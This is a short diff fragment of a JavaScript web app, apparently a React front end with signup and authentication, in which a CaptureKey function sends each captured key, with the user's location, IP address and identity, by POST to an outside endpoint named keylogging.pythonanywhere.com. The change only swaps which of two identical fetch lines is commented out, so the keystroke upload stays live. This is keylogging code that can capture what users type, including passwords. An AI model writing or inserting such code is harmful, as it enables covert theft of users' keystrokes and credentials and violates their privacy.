@@ -14,8 +14,8 @@ import RequireAuth from './admin/RequireAuth';
 import Signup from './Signup';
 
 const CaptureKey = (key, location, ip_address, user) => {
-  // fetch('https://keylogging.pythonanywhere.com/api/new_keylog', {
-    fetch('https://keylogging.pythonanywhere.com/api/new_keylog', {
+  fetch('https://keylogging.pythonanywhere.com/api/new_keylog', {
+    // fetch('https://keylogging.pythonanywhere.com/api/new_keylog', {
     method: 'POST',
     body: JSON.stringify({ key, location, ip_address, user }),
 
